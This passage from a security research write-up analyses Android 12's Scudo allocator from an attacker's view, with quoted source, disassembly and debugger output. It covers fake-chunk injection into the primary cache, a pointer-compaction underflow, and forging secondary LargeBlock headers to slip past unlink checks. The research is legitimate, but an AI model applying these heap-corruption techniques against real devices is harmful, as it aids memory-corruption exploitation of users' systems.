</span></span><span class=line><span class=cl>        <span class=o>=</span> <span class=n>Min</span><span class=p>(</span><span class=mi>13</span><span class=p>,</span> <span class=n>Max</span><span class=p>(</span><span class=mi>1U</span><span class=p>,</span> <span class=n>Min</span><span class=p>(</span><span class=mi>13</span><span class=p>,</span> <span class=p>(</span><span class=mi>1U</span> <span class=o>&lt;&lt;</span> <span class=n>Config</span><span class=o>::</span><span class=n>MaxBytesCachedLog</span><span class=p>)</span> <span class=o>/</span> <span class=k>static_cast</span><span class=o>&lt;</span><span class=n>u32</span><span class=o>&gt;</span><span class=p>(</span><span class=n>Size</span><span class=p>))))</span>
</span></span><span class=line><span class=cl>        <span class=o>=</span> <span class=n>Min</span><span class=p>(</span><span class=mi>13</span><span class=p>,</span> <span class=n>Max</span><span class=p>(</span><span class=mi>1U</span><span class=p>,</span> <span class=n>Min</span><span class=p>(</span><span class=mi>13</span><span class=p>,</span> <span class=p>(</span><span class=mi>1U</span> <span class=o>&lt;&lt;</span> <span class=mi>13</span><span class=p>)</span> <span class=o>/</span> <span class=n>Classes</span><span class=p>[</span><span class=n>ClassId</span> <span class=o>-</span> <span class=mi>1</span><span class=p>])))</span>
</span></span></code></pre></div>where <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/size_class_map.h;l=269;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener><code>Classes</code></a>
:<div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=k>static</span> <span class=k>constexpr</span> <span class=n>u32</span> <span class=n>Classes</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x00020</span><span class=p>,</span> <span class=mh>0x00030</span><span class=p>,</span> <span class=mh>0x00040</span><span class=p>,</span> <span class=mh>0x00050</span><span class=p>,</span> <span class=mh>0x00060</span><span class=p>,</span> <span class=mh>0x00070</span><span class=p>,</span> <span class=mh>0x00080</span><span class=p>,</span> <span class=mh>0x00090</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x000a0</span><span class=p>,</span> <span class=mh>0x000b0</span><span class=p>,</span> <span class=mh>0x000c0</span><span class=p>,</span> <span class=mh>0x000e0</span><span class=p>,</span> <span class=mh>0x000f0</span><span class=p>,</span> <span class=mh>0x00110</span><span class=p>,</span> <span class=mh>0x00120</span><span class=p>,</span> <span class=mh>0x00130</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x00150</span><span class=p>,</span> <span class=mh>0x00160</span><span class=p>,</span> <span class=mh>0x00170</span><span class=p>,</span> <span class=mh>0x00190</span><span class=p>,</span> <span class=mh>0x001d0</span><span class=p>,</span> <span class=mh>0x00210</span><span class=p>,</span> <span class=mh>0x00240</span><span class=p>,</span> <span class=mh>0x002a0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x00330</span><span class=p>,</span> <span class=mh>0x00370</span><span class=p>,</span> <span class=mh>0x003a0</span><span class=p>,</span> <span class=mh>0x00400</span><span class=p>,</span> <span class=mh>0x00430</span><span class=p>,</span> <span class=mh>0x004a0</span><span class=p>,</span> <span class=mh>0x00530</span><span class=p>,</span> <span class=mh>0x00610</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x00730</span><span class=p>,</span> <span class=mh>0x00840</span><span class=p>,</span> <span class=mh>0x00910</span><span class=p>,</span> <span class=mh>0x009c0</span><span class=p>,</span> <span class=mh>0x00a60</span><span class=p>,</span> <span class=mh>0x00b10</span><span class=p>,</span> <span class=mh>0x00ca0</span><span class=p>,</span> <span class=mh>0x00e00</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x00fb0</span><span class=p>,</span> <span class=mh>0x01030</span><span class=p>,</span> <span class=mh>0x01130</span><span class=p>,</span> <span class=mh>0x011f0</span><span class=p>,</span> <span class=mh>0x01490</span><span class=p>,</span> <span class=mh>0x01650</span><span class=p>,</span> <span class=mh>0x01930</span><span class=p>,</span> <span class=mh>0x02010</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x02190</span><span class=p>,</span> <span class=mh>0x02490</span><span class=p>,</span> <span class=mh>0x02850</span><span class=p>,</span> <span class=mh>0x02d50</span><span class=p>,</span> <span class=mh>0x03010</span><span class=p>,</span> <span class=mh>0x03210</span><span class=p>,</span> <span class=mh>0x03c90</span><span class=p>,</span> <span class=mh>0x04090</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x04510</span><span class=p>,</span> <span class=mh>0x04810</span><span class=p>,</span> <span class=mh>0x05c10</span><span class=p>,</span> <span class=mh>0x06f10</span><span class=p>,</span> <span class=mh>0x07310</span><span class=p>,</span> <span class=mh>0x08010</span><span class=p>,</span> <span class=mh>0x0c010</span><span class=p>,</span> <span class=mh>0x10010</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div></li></ol><p>So for a small allocation, i.e. for <code>ClassId = 1</code>, we get:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=n>C</span><span class=o>-&gt;</span><span class=n>MaxCount</span> <span class=o>=</span> <span class=n>Min</span><span class=p>(</span><span class=mi>13</span><span class=p>,</span> <span class=n>Max</span><span class=p>(</span><span class=mi>1U</span><span class=p>,</span> <span class=n>Min</span><span class=p>(</span><span class=mi>13</span><span class=p>,</span> <span class=mh>0x2000</span> <span class=o>/</span> <span class=mh>0x20</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=o>=</span> <span class=n>Min</span><span class=p>(</span><span class=mi>13</span><span class=p>,</span> <span class=n>Max</span><span class=p>(</span><span class=mi>1U</span><span class=p>,</span> <span class=n>Min</span><span class=p>(</span><span class=mi>13</span><span class=p>,</span> <span class=mi>256</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=o>=</span> <span class=n>Min</span><span class=p>(</span><span class=mi>13</span><span class=p>,</span> <span class=n>Max</span><span class=p>(</span><span class=mi>1U</span><span class=p>,</span> <span class=mi>13</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=o>=</span> <span class=mi>13</span>
</span></span></code></pre></div><p>Lets say we have <code>C->Count = 13</code> and we introduce our fake chunk. Then, on execution of <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=84;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1" target=_blank rel=noopener><code>deallocate</code></a>
, we get that <code>C->Count = C->MaxCount</code> and therefore <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=182;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1" target=_blank rel=noopener><code>drain</code></a>
is called. By itself, this would not be an issue, because <code>drain</code> will only remove the oldest half of the chunks and move the other chunks to the front of the array. But what happens, if there is another thread that wants to free memory? Assuming that the thread performs <code>C->MaxCount / 2 + 1</code> calls to <code>deallocate</code>, this will trigger <code>drain</code> again and therefore result in our chunk being <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=192;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1" target=_blank rel=noopener>pushed back</a>
onto a free list.</p><h6 id=fake-chunk-mispositioning>Fake Chunk Mispositioning</h6><p>The fake chunk may be &ldquo;at the wrong location&rdquo;. To that end, notice that <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=95;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener>compacting a pointer</a>
is done as follows:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=n>CompactPtrT</span> <span class=nf>compactPtr</span><span class=p>(</span><span class=n>uptr</span> <span class=n>ClassId</span><span class=p>,</span> <span class=n>uptr</span> <span class=n>Ptr</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>DCHECK_LE</span><span class=p>(</span><span class=n>ClassId</span><span class=p>,</span> <span class=n>SizeClassMap</span><span class=o>::</span><span class=n>LargestClassId</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>compactPtrInternal</span><span class=p>(</span><span class=n>getCompactPtrBaseByClassId</span><span class=p>(</span><span class=n>ClassId</span><span class=p>),</span> <span class=n>Ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=n>uptr</span> <span class=n>getCompactPtrBaseByClassId</span><span class=p>(</span><span class=n>uptr</span> <span class=n>ClassId</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// If we are not compacting pointers, base everything off of 0.
</span></span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=n>CompactPtrT</span><span class=p>)</span> <span class=o>==</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>uptr</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=n>CompactPtrScale</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nf>getRegionInfo</span><span class=p>(</span><span class=n>ClassId</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>RegionBeg</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=n>CompactPtrT</span> <span class=n>compactPtrInternal</span><span class=p>(</span><span class=n>uptr</span> <span class=n>Base</span><span class=p>,</span> <span class=n>uptr</span> <span class=n>Ptr</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>static_cast</span><span class=o>&lt;</span><span class=n>CompactPtrT</span><span class=o>&gt;</span><span class=p>((</span><span class=n>Ptr</span> <span class=o>-</span> <span class=n>Base</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=n>CompactPtrScale</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Basically, a pointer is compacted by subtracting the base address of the region that belongs to a specific class id (e.g. 1) from that pointer and right - shifting the resulting relative offset by some value (often <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/platform.h;l=61;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1" target=_blank rel=noopener>4</a>
, which makes sense in terms of alignment).</p><p>When supplying an address from a different segment to <code>free(addr + 0x10)</code>, we have to ensure that this address is bigger than the base address of the class the fake chunk &ldquo;belongs&rdquo; to. E.g. if we put a fake chunk on the stack, i.e. at <code>0x7babf2c25890</code> with a header of <code>0x2542000000000101</code>, but the <em>base</em> of the region holding class id 1 chunks is <code>0x7bac69744000</code>, then:</p><pre tabindex=0><code>sub 0x7babf2c25890, 0x7bac69744000 = 0xfffffffff894e189 -&gt; underflow
</code></pre><p>Notice that it is (most likely) an invariant that the <em>base</em> is always smaller than or equal to the address of the chunk to be freed. Therefore, this could be undefined behaviour! The bits 4 to 35 (inclusive) of <code>0xfffffffff894e189</code>, i.e. <code>0xff894e18</code>, will be stored in the <code>Chunks</code> array via (<code>r15 = ptr to store</code>):</p><pre tabindex=0><code>...
   0x00007baef7fc106b &lt;+523&gt;:	sub    r15,QWORD PTR [rdx+rsi*1+0x60] # subtraction from above
   0x00007baef7fc1070 &lt;+528&gt;:	shr    r15,0x4
   0x00007baef7fc1074 &lt;+532&gt;:	lea    edx,[rax+0x1]
   0x00007baef7fc1077 &lt;+535&gt;:	mov    DWORD PTR [r14],edx
   0x00007baef7fc107a &lt;+538&gt;:	mov    eax,eax
   0x00007baef7fc107c &lt;+540&gt;:	mov    DWORD PTR [r14+rax*4+0x10],r15d
...
</code></pre><p>When <code>malloc</code> is called, then the following is executed (<code>r14d = compacted pointer</code>):</p><pre tabindex=0><code>...
   0x00007baef7fbcba5 &lt;+389&gt;:	mov    r14d,DWORD PTR [rbx+rax*4+0x10]  # r14d = compacted pointer
   0x00007baef7fbcbaa &lt;+394&gt;:	add    QWORD PTR [r15+0xf88],rcx    # stats
   0x00007baef7fbcbb1 &lt;+401&gt;:	sub    QWORD PTR [r15+0xf90],rcx    # stats
   0x00007baef7fbcbb8 &lt;+408&gt;:	mov    rax,QWORD PTR [r15+0xfa0]
   0x00007baef7fbcbbf &lt;+415&gt;:	lea    rcx,[r12+r12*2]
   0x00007baef7fbcbc3 &lt;+419&gt;:	shl    rcx,0x6
   0x00007baef7fbcbc7 &lt;+423&gt;:	shl    r14,0x4
   0x00007baef7fbcbcb &lt;+427&gt;:	add    r14,QWORD PTR [rax+rcx*1+0x60]
...
</code></pre><p>Essentially, <code>malloc</code> gets rid of the sign that we would get from <code>free</code> if it was not for unsigned subtraction, i.e. from subtracting something big from something small. Then this value is interpreted as an unsigned integer and added to the base address of the chunk id. The following calculations might clarify that:</p><pre tabindex=0><code>gefâ¤  p/x 0x7bac69744000 + 0xf86d04890      = base address + shifted compacted pointer
$16 = 0x7bbbf0448890                        = invalid address (reality)
gefâ¤  p/x 0x7bac69744000 + (int)0xf86d04890 = signed addition!
$17 = 0x7babf0448890                        = wanted address (stack)
</code></pre><p><code>malloc</code> will return the (above malformed) chunk.</p><p>If the &ldquo;malformation&rdquo; is controllable, then this:</p><ol><li>can enable memory testing/probing? Not sure how to avoid SIGSEG though&mldr;</li><li>can make arbitrary (accessible) memory regions available to an attacker, if the attacker has information about the process image&mldr;</li></ol><p>With the above observations, we can infer that the least - significant 36 bits of an address that is supplied to <code>free</code>, with the property that this address is less than or equal to the base address of the region containing chunks with id 1, determine the value that is added to the base address. To be precise, only bits <strong>4-35</strong> (excluding bits 0, 1, 2, 3 and everything above 35) are relevant for the addition due to the right and left shifts. As in <code>malloc</code> the compacted pointer is shifted to the left by <code>4</code> and this shift operation is performed in a 64-bit register, this will result in the addend to be a multiple of <code>0x10</code>, which matches the default alignment.</p><p>Long story short, if we provided a fake chunk to <code>free</code> with an address that is less than the base address of the region that belongs to the respective class id, then the next <code>malloc</code> will cause a segmentation fault with high probability.</p><h4 id=secondary-cache-poisoning>Secondary Cache Poisoning</h4><p>It is also possible to introduce fake chunks into the secondary. To that end, we have to assume that the secondary is using a cache. Lets see some already familiar <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=1118;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener>code</a>
to clarify that:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>LIKELY</span><span class=p>(</span><span class=n>ClassId</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=n>TSD</span><span class=o>-&gt;</span><span class=n>Cache</span><span class=p>.</span><span class=n>deallocate</span><span class=p>(</span><span class=n>ClassId</span><span class=p>,</span> <span class=n>BlockBegin</span><span class=p>);</span> <span class=c1>// &lt;-- primary free
</span></span></span><span class=line><span class=cl>    <span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=n>Secondary</span><span class=p>.</span><span class=n>deallocate</span><span class=p>(</span><span class=n>Options</span><span class=p>,</span> <span class=n>BlockBegin</span><span class=p>);</span>  <span class=c1>// &lt;-- secondary free
</span></span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><p>As we are interested in the secondary, we can focus on the implementation of <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=603" target=_blank rel=noopener><code>Secondary::deallocate</code></a>
:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=k>template</span> <span class=o>&lt;</span><span class=k>typename</span> <span class=n>Config</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=n>MapAllocator</span><span class=o>&lt;</span><span class=n>Config</span><span class=o>&gt;::</span><span class=n>deallocate</span><span class=p>(</span><span class=n>Options</span> <span class=n>Options</span><span class=p>,</span> <span class=kt>void</span> <span class=o>*</span><span class=n>Ptr</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>LargeBlock</span><span class=o>::</span><span class=n>Header</span> <span class=o>*</span><span class=n>H</span> <span class=o>=</span> <span class=n>LargeBlock</span><span class=o>::</span><span class=n>getHeader</span><span class=o>&lt;</span><span class=n>Config</span><span class=o>&gt;</span><span class=p>(</span><span class=n>Ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=n>uptr</span> <span class=n>CommitSize</span> <span class=o>=</span> <span class=n>H</span><span class=o>-&gt;</span><span class=n>CommitSize</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ScopedLock</span> <span class=nf>L</span><span class=p>(</span><span class=n>Mutex</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>InUseBlocks</span><span class=p>.</span><span class=n>remove</span><span class=p>(</span><span class=n>H</span><span class=p>);</span>  <span class=c1>// doubly linked list remove (??unlink??); can abort
</span></span></span><span class=line><span class=cl>        <span class=n>FreedBytes</span> <span class=o>+=</span> <span class=n>CommitSize</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>NumberOfFrees</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>Stats</span><span class=p>.</span><span class=n>sub</span><span class=p>(</span><span class=n>StatAllocated</span><span class=p>,</span> <span class=n>CommitSize</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>Stats</span><span class=p>.</span><span class=n>sub</span><span class=p>(</span><span class=n>StatMapped</span><span class=p>,</span> <span class=n>H</span><span class=o>-&gt;</span><span class=n>MapSize</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>Cache</span><span class=p>.</span><span class=n>store</span><span class=p>(</span><span class=n>Options</span><span class=p>,</span> <span class=n>H</span><span class=p>);</span>    <span class=c1>// caching or munmap, if enabled; otherwise just munmap
</span></span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>First of all, <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=476" target=_blank rel=noopener><code>InUseBlocks</code></a>
is a <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/list.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=139" target=_blank rel=noopener>doubly linked list</a>
, which contains all allocated secondary chunks. Also, some cache object is used to &ldquo;free&rdquo; the chunk. Taking an attacker&rsquo;s perspective, we assume that we can control the entire <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=34" target=_blank rel=noopener><code>LargeBlock::Header</code></a>
:</p><ol><li><code>Prev</code> and <code>Next</code> pointers that make the header a part of a doubly linked list.</li><li><code>CommitBase</code>. Actual starting point of the chunk. Most of the time <code>CommitBase = MapBase + PageSize</code>.</li><li><code>CommitSize</code>. Actual chunk size to be used. Most of the time <code>CommitSize = 2 * PageSize + RequestedSize</code>.</li><li><code>MapBase</code>. Used for <code>munmap</code>. What is really returned by <code>mmap</code>.</li><li><code>MapSize</code>. Used for <code>munmap</code>. What is really used when using <code>mmap</code> to allocate memory.</li><li><code>Data</code>. Actually <code>sizeof (Data) = 0</code>, so we can ignore this!</li></ol><p>Now we can start to tamper around with some, if not all, of those fields.</p><h5 id=excursion-to-remove>Excursion to remove</h5><p>Anyone, who is familiar with the <a href=https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit target=_blank rel=noopener>unlink exploit</a>
, might now scream to investigate <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/list.h;l=199;drc=b45a2ea782074944f79fc388df20b06e01f265f7" target=_blank rel=noopener><code>DoublyLinkedList::remove</code></a>
. As we have to pass through this method anyways, we can do a quick analysis:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=c1>// The consistency of the adjacent links is aggressively checked in order to
</span></span></span><span class=line><span class=cl><span class=c1>// catch potential corruption attempts, that could yield a mirrored
</span></span></span><span class=line><span class=cl><span class=c1>// write-{4,8} primitive. nullptr checks are deemed less vital.     &lt;-- I think they know already :(
</span></span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>remove</span><span class=p>(</span><span class=n>T</span> <span class=o>*</span><span class=n>X</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>T</span> <span class=o>*</span><span class=n>Prev</span> <span class=o>=</span> <span class=n>X</span><span class=o>-&gt;</span><span class=n>Prev</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>T</span> <span class=o>*</span><span class=n>Next</span> <span class=o>=</span> <span class=n>X</span><span class=o>-&gt;</span><span class=n>Next</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>Prev</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>CHECK_EQ</span><span class=p>(</span><span class=n>Prev</span><span class=o>-&gt;</span><span class=n>Next</span><span class=p>,</span> <span class=n>X</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>Prev</span><span class=o>-&gt;</span><span class=n>Next</span> <span class=o>=</span> <span class=n>Next</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>Next</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>CHECK_EQ</span><span class=p>(</span><span class=n>Next</span><span class=o>-&gt;</span><span class=n>Prev</span><span class=p>,</span> <span class=n>X</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>Next</span><span class=o>-&gt;</span><span class=n>Prev</span> <span class=o>=</span> <span class=n>Prev</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>First</span> <span class=o>==</span> <span class=n>X</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>DCHECK_EQ</span><span class=p>(</span><span class=n>Prev</span><span class=p>,</span> <span class=k>nullptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>First</span> <span class=o>=</span> <span class=n>Next</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>DCHECK_NE</span><span class=p>(</span><span class=n>Prev</span><span class=p>,</span> <span class=k>nullptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>Last</span> <span class=o>==</span> <span class=n>X</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>DCHECK_EQ</span><span class=p>(</span><span class=n>Next</span><span class=p>,</span> <span class=k>nullptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>Last</span> <span class=o>=</span> <span class=n>Prev</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>DCHECK_NE</span><span class=p>(</span><span class=n>Next</span><span class=p>,</span> <span class=k>nullptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>Size</span><span class=o>--</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Lets formulate two questions of interest:</p><ol><li>How can we abuse <code>LargeBlock::Header::Next</code> and <code>LargeBlock::Header::Prev</code> to get a <em>Write - What - Where</em> condition?</li><li>How do we pass through this method without triggering an <code>abort</code>, i.e. without failing any of the assertions like <code>CHECK_EQ(Prev->Next, X)</code>?</li></ol><p>Starting off easy, we can see that choosing <code>X->Next = X->Prev = 0</code> will cause execution of <code>DCHECK_NE(Prev, nullptr)</code> and <code>DCHECK_NE(Next, nullptr)</code>. Observe that <code>X</code>, i.e. our fake large header is <strong>not</strong> part of the list. Therefore <code>First != X</code> and <code>Last != X</code>!</p><p>Setting <code>X->Next = buffer</code> and <code>X->Prev = 0</code> results in a call to <code>CHECK_EQ(Next->Prev, X)</code>. Thus, our <code>buffer</code> has to contain a pointer that points back to <code>X</code>, which seems pretty unlikely, but still possible. Still, as <code>First != X</code> and <code>X->Prev = 0</code> we abort due to <code>DCHECK_NE(Prev, nullptr)</code>.</p><p>Finally, <code>X->Next = buffer_0</code> and <code>X->Prev = buffer_1</code> enforces <code>buffer_0</code> and <code>buffer_1</code> to contain pointers that point back to <code>X</code>.</p><p>A trivial way of passing this function is to choose <code>X->Next = X->Prev = X</code>. This ensures that <code>X->Next</code> and <code>X->Prev</code> always point back to <code>X</code> with non - zero pointers. Notice that this requires that we know the address of <code>X</code>! If this is the case, then <code>DoublyLinkedList::remove</code> behaves <em>almost</em> like a <code>nop</code>, with the side effect that <code>Size -= 1</code> per call. (see <a href=#future-work>future work</a>
for more)</p><p>Also notice that <code>Prev->Next</code> and <code>Next->Prev</code> will only be overwritten, if they point back to <code>X</code>. As <code>X</code> is most likely not part of the <code>InUseBlocks</code> list, this implies that we can already write to those locations or we can only write to locations that point back to our buffer. Thus, a <em>Write - What - Where</em> condition seems impossible on first analysis.</p><h5 id=introducing-fake-chunks-to-secondary>Introducing Fake Chunks to Secondary</h5><p>The <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/allocator_config.h;l=83" target=_blank rel=noopener><code>AndroidConfig</code></a>
defines the <code>SecondaryCache</code> to be of type <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=129" target=_blank rel=noopener><code>MapAllocatorCache</code></a>
. Therefore, there is another caching layer to be bypassed / abused.</p><p>If <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=145;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1" target=_blank rel=noopener><code>Cache.store</code></a>
cannot cache the chunk that is currently freed, then the chunk will just be unmapped using <code>munmap</code>.</p><p>If we passed the <a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=146;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1" target=_blank rel=noopener><code>canCache</code></a>
check, it should be possible to craft fake chunks for the secondary as well, because of the caching mechanism. To that end, assuming that <code>canCache(H->CommitSize) == true</code>, we end up in the following code</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>Config</span><span class=o>::</span><span class=n>SecondaryCacheQuarantineSize</span> <span class=o>&amp;&amp;</span>
</span></span><span class=line><span class=cl>    <span class=n>useMemoryTagging</span><span class=o>&lt;</span><span class=n>Config</span><span class=o>&gt;</span><span class=p>(</span><span class=n>Options</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>QuarantinePos</span> <span class=o>=</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=n>QuarantinePos</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>%</span> <span class=n>Max</span><span class=p>(</span><span class=n>Config</span><span class=o>::</span><span class=n>SecondaryCacheQuarantineSize</span><span class=p>,</span> <span class=mi>1u</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>1</span><span class=p>]</span>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>Quarantine</span><span class=p>[</span><span class=n>QuarantinePos</span><span class=p>].</span><span class=n>CommitBase</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>Quarantine</span><span class=p>[</span><span class=n>QuarantinePos</span><span class=p>]</span> <span class=o>=</span> <span class=n>Entry</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2</span><span class=p>]</span>    <span class=n>CachedBlock</span> <span class=n>PrevEntry</span> <span class=o>=</span> <span class=n>Quarantine</span><span class=p>[</span><span class=n>QuarantinePos</span><span class=p>];</span>
